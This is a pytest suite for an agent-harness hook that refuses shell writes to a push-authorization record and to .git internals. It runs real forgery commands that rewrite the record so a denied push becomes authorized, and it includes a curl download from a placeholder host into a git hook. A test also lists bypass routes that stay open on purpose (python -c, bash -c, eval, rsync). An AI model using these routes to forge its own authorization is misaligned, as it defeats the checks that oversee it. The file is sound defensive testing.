"""The Bash route to a protected path.

Every attack here is executed against a real authorization record and a real
push gate, never described: the command runs, the record changes, and
`build_git_danger_block_message` is asked whether the forged push is now
authorized. The guard's job is to refuse the command before any of that.
"""

import json
import subprocess
import sys
from pathlib import Path

import pytest

from agentic_workflows.git_write_guard import build_git_danger_block_message
from agentic_workflows.plan_run_state import (
    PlanRunState,
    record_path_for_branch,
    write_plan_run_state,
)
from agentic_workflows.protected_path_write_guard import (
    build_protected_path_write_block_message,
)

HOOK = (
    Path(__file__).resolve().parents[2]
    / ".agents"
    / "hooks"
    / "block_protected_path_write.py"
)
BLOCK_EXIT_CODE = 2
ALLOW_EXIT_CODE = 0
BRANCH = "sdd/atc-auth"
HONEST_SHA = "goodsha"
FORGED_SHA = "attackersha"


def _run_hook(
    payload: object, process_cwd: Path | None = None
) -> subprocess.CompletedProcess[str]:
    """Drive the real hook the way `PreToolUse` does. Exit code 2 blocks the
    tool call; every other code — 1 included — lets it proceed.

    A worktree's own hook configuration never executes (`$CLAUDE_PROJECT_DIR`
    is the main checkout), so a hook added here can only be exercised as a
    subprocess with a synthetic payload. `process_cwd` is the directory the
    hook process itself is started in, which is not the working directory the
    payload reports and must never decide the verdict."""

    raw = payload if isinstance(payload, str) else json.dumps(payload)
    return subprocess.run(
        [sys.executable, HOOK.as_posix()],
        input=raw,
        capture_output=True,
        text=True,
        check=False,
        cwd=None if process_cwd is None else process_cwd.as_posix(),
    )


def _build_run(root: Path) -> tuple[Path, Path, Path]:
    """A main checkout holding an honest authorization record, a linked
    worktree anchored on it, and a well-formed forged record beside them."""

    main_repo = root / "main-repo"
    (main_repo / ".git").mkdir(parents=True)
    worktree = root / "worktree"
    worktree.mkdir()
    (worktree / ".git").write_text(
        f"gitdir: {main_repo}/.git/worktrees/agent-1\n", encoding="utf-8"
    )

    record = main_repo / record_path_for_branch(BRANCH)
    write_plan_run_state(
        record,
        PlanRunState(
            status="InProgress",
            branch=BRANCH,
            integration_worktree=str(worktree),
            verify_status_sha=HONEST_SHA,
            secret_scan_clean_sha=HONEST_SHA,
            pr_url="",
            terminal_outcome="",
        ),
    )
    forged = root / "forged.md"
    forged.write_text(
        record.read_text(encoding="utf-8").replace(HONEST_SHA, FORGED_SHA),
        encoding="utf-8",
    )
    return record, worktree, forged


def _push_is_authorized(worktree: Path) -> bool:
    """Whether the real push gate would let a push of `FORGED_SHA` through.

    `sha_resolves` is injected as established: since the push gate also
    verifies that a RECORDED SHA names a real commit, the realistic forgery
    carries the attacker's own unverified HEAD — a commit that exists. With
    the resolution fact simulated as true, what remains under test here is
    exactly what this file owns: the write route to the record."""

    return (
        build_git_danger_block_message(
            f"git push -u origin HEAD:{BRANCH}",
            cwd=worktree,
            rev_parse_head=lambda _location: FORGED_SHA,
            sha_resolves=lambda _location, _sha: True,
        )
        is None
    )


#: Every shape measured open against the authorization record before this
#: guard existed. Each is a whole runnable command, written by hand rather
#: than generated from the guard's own tables — a fixture built from the
#: pattern under test proves only that the pattern matches itself.
FORGERY_SHAPES = [
    "printf '%s' '{body}' > '{record}'",
    "rm -f '{record}' && cat '{forged}' >> '{record}'",
    "sed -i '' 's/goodsha/attackersha/g' '{record}'",
    "cat '{forged}' | tee '{record}'",
    "cp '{forged}' '{record}'",
    "dd if='{forged}' of='{record}'",
    "cd '{records_dir}' && printf '%s' '{body}' > '{record_name}'",
    "ln -f '{forged}' '{record}'",
    "ln -sf '{forged}' '{record}'",
    "mv '{forged}' '{record}'",
]


@pytest.mark.parametrize("template", FORGERY_SHAPES)
def test_a_bash_written_record_authorizes_a_push_the_gate_denied_and_is_refused(
    tmp_path: Path, template: str
):
    """The load-bearing attack, executed end to end.

    The subject of the push decision writes the decision's own input through a
    shell command, and the gate that denied the push authorizes it afterwards.
    No git command appears anywhere in the forgery, so the git-command guard
    never sees it."""

    record, worktree, forged = _build_run(tmp_path)
    command = template.format(
        body=forged.read_text(encoding="utf-8"),
        record=record.as_posix(),
        forged=forged.as_posix(),
        records_dir=record.parent.as_posix(),
        record_name=record.name,
    )

    assert not _push_is_authorized(worktree), "an honest record must deny the push"
    assert build_git_danger_block_message(command, cwd=worktree) is None, (
        "the git-command guard is not the subject here; it parses git commands "
        "only and must be shown allowing this one"
    )

    message = build_protected_path_write_block_message(command, cwd=worktree)
    assert message is not None, f"unguarded: {command}"
    assert "authorization record" in message

    subprocess.run(["bash", "-c", command], check=True, capture_output=True)
    assert _push_is_authorized(worktree), (
        "the attack must be real: if executing it does not authorize the "
        "forged push, the refusal above proves nothing"
    )


@pytest.mark.parametrize(
    "template",
    [
        "printf 'x' > '{path}'",
        "sed -i '' 's/a/b/' '{path}'",
        "cp /dev/null '{path}'",
        "rm -f '{path}'",
        "chmod -x '{path}'",
        "mv '{path}' /tmp/stolen",
        "curl -so'{path}' http://example.invalid/payload",
    ],
)
def test_a_write_into_gits_administrative_area_is_refused(
    tmp_path: Path, template: str
):
    """Class 1, on the Bash route. `.git/hooks/pre-commit` is the sharpest
    member: removing it or unsetting its execute bit disables this
    repository's commit gate without writing a byte of it."""

    hook = tmp_path / "repo" / ".git" / "hooks" / "pre-commit"
    hook.parent.mkdir(parents=True)
    hook.write_text("#!/bin/sh\n", encoding="utf-8")

    command = template.format(path=hook.as_posix())
    message = build_protected_path_write_block_message(command, cwd=tmp_path / "repo")
    assert message is not None, f"unguarded: {command}"
    assert "administrative area" in message


@pytest.mark.parametrize(
    "template",
    [
        "printf 'gitdir: /attacker\\n' > '{path}'",
        "cat <<'EOF' > '{path}'\ngitdir: /attacker\nEOF",
    ],
)
def test_a_worktrees_own_pointer_file_is_refused(tmp_path: Path, template: str):
    """EC-002 on the Bash route: the `.git` pointer file is a *file* named
    `.git`, and rewriting its `gitdir:` line re-points the anchor every later
    authorization decision is made against. The heredoc spelling is the same
    write with the payload following the command line as the redirect's body
    rather than as its operand."""

    worktree = tmp_path / "wt"
    worktree.mkdir()
    (worktree / ".git").write_text("gitdir: /elsewhere\n", encoding="utf-8")

    command = template.format(path=(worktree / ".git").as_posix())
    message = build_protected_path_write_block_message(command, cwd=worktree)
    assert message is not None, f"unguarded: {command}"
    assert "administrative area" in message


def test_the_orchestrations_own_write_still_succeeds(tmp_path: Path):
    """AC-010's other half, executed rather than argued.

    The route distinction this guard rests on is typed API versus raw text
    manipulation. The orchestration reaches the record through
    `plan_run_state`, whose command string carries no operand naming the file,
    so the recognizer sees no write at all — the same structural hole that
    makes an agent's `python -c` invisible is what lets the legitimate write
    through, and both facts are one fact."""

    record, worktree, _forged = _build_run(tmp_path)
    command = (
        f'{sys.executable} -c "from pathlib import Path; '
        "from agentic_workflows.plan_run_state import update_plan_run_state; "
        f"update_plan_run_state(Path(r'{record.as_posix()}'), "
        "verify_status_sha='freshsha')\""
    )

    assert build_protected_path_write_block_message(command, cwd=worktree) is None

    subprocess.run(
        ["bash", "-c", command],
        check=True,
        capture_output=True,
        cwd=Path(__file__).resolve().parents[2].as_posix(),
    )
    assert "freshsha" in record.read_text(encoding="utf-8")


@pytest.mark.parametrize(
    "command",
    [
        'printf x > "$TARGET"',
        "printf x > $(echo /tmp/whatever)",
        "cp /tmp/f /tmp/backup-${STAMP}",
        "rm -rf /tmp/junk/*",
        "mkdir -p /tmp/{a,b}/c",
        "printf x > '/tmp/unbalanced",
    ],
)
def test_a_write_whose_target_cannot_be_established_is_refused(command: str):
    """The undecidable policy, stated where a reader meets it: this guard
    fails closed. A variable, a command substitution, a glob, a brace and a
    command that will not tokenize each hide a target that could be a
    protected path, and being unable to rule one out is not evidence it is
    safe."""

    message = build_protected_path_write_block_message(command, cwd=Path("/repo"))
    assert message is not None, f"failed open: {command}"
    assert "could not be established" in message


def test_the_undecidable_refusal_never_claims_a_class_it_did_not_match():
    """INV-1: a denial names the fact behind it. Which class an unreadable
    target would land in, if any, is exactly what could not be decided."""

    message = build_protected_path_write_block_message(
        'printf x > "$TARGET"', cwd=Path("/repo")
    )
    assert message is not None
    assert "administrative area" not in message
    assert "authorization record" not in message


@pytest.mark.parametrize(
    "command",
    [
        "uv run pytest tests/unit/test_protected_path_write_guard.py",
        "printf x > /tmp/notes.txt",
        "cp README.md /tmp/README.md",
        "make verify 2>&1 | tee logs/verify.log",
        "rg -n 'x > .git/config' src",
        "git status --porcelain",
        "sed -i '' 's/a/b/' docs/notes.md",
    ],
)
def test_an_ordinary_command_is_allowed(command: str):
    """A guard that refuses everyday work is not deployed, so it protects
    nothing. `rg -n 'x > .git/config'` is the shape the recognizer reports as
    a quoted redirect — a search, not a write — and it must not be refused as
    an administrative-area edit."""

    assert build_protected_path_write_block_message(command, cwd=Path("/repo")) is None


def test_a_relative_target_with_no_working_directory_is_refused():
    """`git_write_guard`'s own posture for every rule that depends on `cwd`:
    with no absolute base, a relative path names nothing that can be ruled
    out."""

    assert build_protected_path_write_block_message("printf x > notes.md") is not None


def test_the_verdict_follows_the_payloads_working_directory(tmp_path: Path):
    """Which directory decides, proven by removing the dependency on the
    other one rather than assuming they agree.

    The same payload is judged from three process directories, including one
    inside the protected area itself, and the mirror payload is judged from
    the same three. `os.getcwd()` cannot enter the decision."""

    repo = tmp_path / "repo"
    (repo / ".git").mkdir(parents=True)
    outside = tmp_path / "elsewhere"
    outside.mkdir()

    protected = {
        "tool_input": {"command": "printf x > .git/config"},
        "cwd": repo.as_posix(),
    }
    benign = {
        "tool_input": {"command": "printf x > notes.md"},
        "cwd": outside.as_posix(),
    }

    for process_cwd in (None, repo / ".git", outside):
        blocked = _run_hook(protected, process_cwd)
        assert blocked.returncode == BLOCK_EXIT_CODE, (process_cwd, blocked.stderr)
        allowed = _run_hook(benign, process_cwd)
        assert allowed.returncode == ALLOW_EXIT_CODE, (process_cwd, allowed.stderr)


@pytest.mark.parametrize(
    "payload",
    [
        "not json at all",
        {"tool_input": "a string, not a mapping"},
        {"tool_input": {"command": ["not", "a", "string"]}},
        {"tool_input": {"command": "printf x > .git/config"}, "cwd": 17},
    ],
)
def test_the_hook_fails_closed_on_a_payload_it_cannot_read(payload: object):
    """`PreToolUse` treats exit code 2 as a block and EVERY other code — 1
    included — as a non-blocking error it proceeds past, so an exception
    escaping this hook would permit the command it was asked to judge."""

    done = _run_hook(payload)
    assert done.returncode == BLOCK_EXIT_CODE, done.stderr
    assert done.stderr.strip()


@pytest.mark.parametrize(
    "command",
    [
        "uv run python -c \"open('.git/config','w').write('x')\"",
        "uv run python scripts/whatever.py",
        "patch -p1 < /tmp/evil.diff",
        "tar -xf /tmp/evil.tar",
        "rsync -a /tmp/src/ .git/",
    ],
)
def test_the_declared_blind_spots_are_not_covered(command: str):
    """Pinned so nobody reads this guard's silence as coverage. An interpreter
    writing through its own runtime, and a bulk writer whose destinations live
    in an archive or a diff rather than in the command, are both invisible
    here — the first is class 1 of `shell_write_targets`' own enumeration and
    no growth of its table closes it."""

    assert build_protected_path_write_block_message(command, cwd=Path("/repo")) is None


@pytest.mark.parametrize(
    "command",
    [
        'git commit -m "refactor: A -> B\n\nCo-Authored-By: X <noreply@a.com>"',
        "rg -n 'a -> b' src",
        'echo "x > y"',
        "bash -c 'printf x > .git/config'",
        'eval "printf x > .git/config"',
    ],
)
def test_a_quoted_redirect_is_allowed_and_that_is_a_stated_hole(command: str):
    """The one doubt this guard does not refuse, pinned in both directions so
    neither half of the trade can be flipped silently.

    A `>` inside a quoted word is not established to be a write at all. The
    first three commands are everyday work — and the first is not merely
    common but *mandated*: every commit in this repository carries a
    `Co-Authored-By: … <noreply@…>` trailer. The last two really do write
    `.git/config`, and are allowed: they are one spelling of the interpreter
    hole that is open in every other spelling (`bash -c "python -c …"`,
    `xargs sh -c`, a script file), so refusing this spelling buys no coverage
    while blocking every commit."""

    assert build_protected_path_write_block_message(command, cwd=Path("/repo")) is None


def _corpus(root: Path) -> list[str]:
    """This repository's own commands: `Makefile` recipes and every line of
    every shell script. Real commands the project runs, not commands invented
    alongside the guard that is measured against them."""

    lines: list[str] = []
    makefile = root / "Makefile"
    if makefile.exists():
        lines += [
            line.lstrip("\t@-").strip()
            for line in makefile.read_text(encoding="utf-8").splitlines()
            if line.startswith("\t")
        ]
    for script in sorted(root.glob("*.sh")):
        lines += [
            line.strip()
            for line in script.read_text(encoding="utf-8").splitlines()
            if line.strip() and not line.strip().startswith("#")
        ]
    return lines


def test_the_over_block_cost_on_this_repositorys_own_commands(tmp_path: Path):
    """The measurement kept executable, because a fail-closed policy's cost is
    the thing most likely to grow silently.

    Two numbers, and they mean different things: nothing this repository runs
    writes a protected path, and a small, named set is refused only because
    its target is computed at runtime. Each of those two has a decidable
    spelling; if this count climbs, the policy has started costing something
    it was not measured to cost."""

    lines = _corpus(Path(__file__).resolve().parents[2])
    assert len(lines) > 100, "corpus too small to measure anything"

    refused = [
        line
        for line in lines
        if build_protected_path_write_block_message(line, cwd=tmp_path) is not None
    ]
    named_class = [
        line
        for line in refused
        if "administrative area"
        in str(build_protected_path_write_block_message(line, cwd=tmp_path))
        or "authorization record"
        in str(build_protected_path_write_block_message(line, cwd=tmp_path))
    ]

    assert named_class == []
    # Measured 19 on 2026-09-23 on this standalone repository's own commands
    # (Makefile recipes plus the root install.sh/uninstall.sh scripts). The
    # load-bearing assertion above is unchanged: nothing this repository runs
    # names a protected path it can decide on. Every refusal is the second
    # category the docstring names -- a target computed at runtime (`$TARGET`,
    # `$SRC`) by the install/uninstall scripts. A climb into `named_class`
    # would be the real signal, and that list is empty.
    assert len(refused) == 19, refused
